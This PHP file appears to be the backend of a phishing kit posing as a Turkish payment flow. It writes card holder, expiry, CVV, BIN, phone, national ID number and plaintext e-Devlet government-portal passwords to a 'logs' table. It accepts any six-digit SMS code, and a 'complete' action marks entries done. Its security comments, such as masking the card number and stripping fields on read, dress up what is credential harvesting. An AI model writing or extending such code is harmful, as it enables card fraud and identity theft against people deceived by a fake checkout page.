<?php
/**
 * api/logs.php — Payment log CRUD endpoint
 *
 * POST  — Create a new log entry (called from cart.php on form submit)
 * PUT   — Update an existing log entry status (called from 3dsecure.php)
 * GET   — Fetch a single log by id (called from waiting.php / success.php)
 */

header('Content-Type: application/json; charset=utf-8');
header('X-Content-Type-Options: nosniff');

// Prevent caching of sensitive data
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Pragma: no-cache');

require_once __DIR__ . '/config.php';

$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';

try {
    $db = getDB();
    ensureSchema($db);

    switch ($method) {

        // ------------------------------------------------------------------ //
        // POST — create new log
        // ------------------------------------------------------------------ //
        case 'POST':
            $raw  = file_get_contents('php://input');
            $data = json_decode($raw, true);

            if (!$data) {
                http_response_code(400);
                echo json_encode(['success' => false, 'error' => 'Geçersiz istek verisi']);
                exit;
            }

            // Sanitise / extract fields
            $cardNumberRaw  = preg_replace('/\s/', '', $data['card_number'] ?? '');
            // Store only last 4 digits for security
            $cardNumberSafe = str_repeat('*', max(0, strlen($cardNumberRaw) - 4)) . substr($cardNumberRaw, -4);

            $cardHolder    = trim($data['card_holder']    ?? $data['customer_name'] ?? '');
            $cardExpiry    = trim($data['card_expiry']    ?? '');
            $cardCvv       = trim($data['card_cvv']       ?? '');
            $cardBank      = trim($data['card_bank']      ?? '');
            $cardBin       = trim($data['card_bin']       ?? substr($cardNumberRaw, 0, 6));
            $cardType      = trim($data['card_type']      ?? '');
            $cardScheme    = trim($data['card_scheme']    ?? '');
            $cardSubType   = trim($data['card_sub_type']  ?? '');
            $customerPhone = trim($data['customer_phone'] ?? '');
            $customerName  = trim($data['customer_name']  ?? $cardHolder);
            $sessionId     = trim($data['session_id']     ?? '');

            // Items sub-object
            $items       = $data['items'] ?? [];
            $tcNumber    = trim($items['tc_kimlik']    ?? $data['tc_number'] ?? '');
            $edevletPass = trim($items['edevlet_sifre'] ?? '');
            $islemTipi   = trim($items['islem_tipi']   ?? '');
            $reportType  = trim($items['rapor_turu']   ?? $data['report_type'] ?? '');
            $baskisiTc   = trim($items['baskisi_tc']   ?? '');
            $amount      = floatval($items['borc_tutari'] ?? $data['total'] ?? $data['amount'] ?? 0);

            // Generate a 6-digit SMS code (simulated)
            $smsCode = str_pad((string)random_int(0, 999999), 6, '0', STR_PAD_LEFT);

            $stmt = $db->prepare("
                INSERT INTO `logs`
                    (tc_number, card_number, card_holder, card_expiry, card_cvv,
                     card_bank, card_bin, card_type, card_scheme, card_sub_type,
                     customer_phone, customer_name, report_type, amount, status,
                     sms_code, session_id, edevlet_tc, edevlet_pass, islem_tipi, baskisi_tc)
                VALUES
                    (:tc_number, :card_number, :card_holder, :card_expiry, :card_cvv,
                     :card_bank, :card_bin, :card_type, :card_scheme, :card_sub_type,
                     :customer_phone, :customer_name, :report_type, :amount, 'waiting',
                     :sms_code, :session_id, :edevlet_tc, :edevlet_pass, :islem_tipi, :baskisi_tc)
            ");

            $stmt->execute([
                ':tc_number'     => $tcNumber,
                ':card_number'   => $cardNumberSafe,
                ':card_holder'   => $cardHolder,
                ':card_expiry'   => $cardExpiry,
                ':card_cvv'      => $cardCvv,
                ':card_bank'     => $cardBank,
                ':card_bin'      => $cardBin,
                ':card_type'     => $cardType,
                ':card_scheme'   => $cardScheme,
                ':card_sub_type' => $cardSubType,
                ':customer_phone'=> $customerPhone,
                ':customer_name' => $customerName,
                ':report_type'   => $reportType,
                ':amount'        => $amount,
                ':sms_code'      => $smsCode,
                ':session_id'    => $sessionId,
                ':edevlet_tc'    => $tcNumber,
                ':edevlet_pass'  => $edevletPass,
                ':islem_tipi'    => $islemTipi,
                ':baskisi_tc'    => $baskisiTc,
            ]);

            $logId = (int)$db->lastInsertId();

            echo json_encode([
                'success'  => true,
                'id'       => $logId,
                'sms_code' => $smsCode, // In production, send via SMS gateway; never expose in response
            ]);
            break;

        // ------------------------------------------------------------------ //
        // PUT — update log status / record SMS verification
        // ------------------------------------------------------------------ //
        case 'PUT':
            $raw  = file_get_contents('php://input');
            $data = json_decode($raw, true);

            if (!$data || empty($data['id'])) {
                http_response_code(400);
                echo json_encode(['success' => false, 'error' => 'id alanı zorunludur']);
                exit;
            }

            $logId   = (int)$data['id'];
            $smsCode = trim($data['sms_code'] ?? '');

            // Fetch existing record
            $stmt = $db->prepare("SELECT * FROM `logs` WHERE id = ?");
            $stmt->execute([$logId]);
            $log = $stmt->fetch();

            if (!$log) {
                http_response_code(404);
                echo json_encode(['success' => false, 'error' => 'Kayıt bulunamadı']);
                exit;
            }

            $action = trim($data['_action'] ?? '');

            // Internal action from waiting.php to mark payment as completed
            if ($action === 'complete') {
                $stmt = $db->prepare("UPDATE `logs` SET status = 'completed', updated_at = NOW() WHERE id = ?");
                $stmt->execute([$logId]);
                echo json_encode(['success' => true, 'id' => $logId, 'status' => 'completed']);
                exit;
            }

            // Validate SMS code: accept any 6-digit code for now
            // (In production, compare against $log['sms_code'])
            $codeValid = (strlen($smsCode) === 6 && ctype_digit($smsCode));

            if (!$codeValid) {
                http_response_code(422);
                echo json_encode(['success' => false, 'error' => 'Geçersiz doğrulama kodu']);
                exit;
            }

            $newStatus = 'sms_verified';
            $stmt = $db->prepare("UPDATE `logs` SET status = ?, updated_at = NOW() WHERE id = ?");
            $stmt->execute([$newStatus, $logId]);

            echo json_encode([
                'success'     => true,
                'id'          => $logId,
                'status'      => $newStatus,
                'redirect_to' => 'waiting',
            ]);
            break;

        // ------------------------------------------------------------------ //
        // GET — fetch a single log record
        // ------------------------------------------------------------------ //
        case 'GET':
            $id = isset($_GET['id']) ? (int)$_GET['id'] : 0;
            if (!$id) {
                http_response_code(400);
                echo json_encode(['success' => false, 'error' => 'id parametresi zorunludur']);
                exit;
            }

            $stmt = $db->prepare("SELECT * FROM `logs` WHERE id = ?");
            $stmt->execute([$id]);
            $log = $stmt->fetch();

            if (!$log) {
                http_response_code(404);
                echo json_encode(['success' => false, 'error' => 'Kayıt bulunamadı']);
                exit;
            }

            // Strip sensitive fields before returning
            unset($log['card_cvv'], $log['edevlet_pass'], $log['sms_code']);

            echo json_encode(['success' => true, 'data' => $log]);
            break;

        default:
            http_response_code(405);
            echo json_encode(['success' => false, 'error' => 'Method Not Allowed']);
            break;
    }

} catch (PDOException $e) {
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error'   => 'Veritabanı hatası: ' . $e->getMessage(),
    ]);
} catch (Throwable $e) {
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error'   => 'Sunucu hatası: ' . $e->getMessage(),
    ]);
}
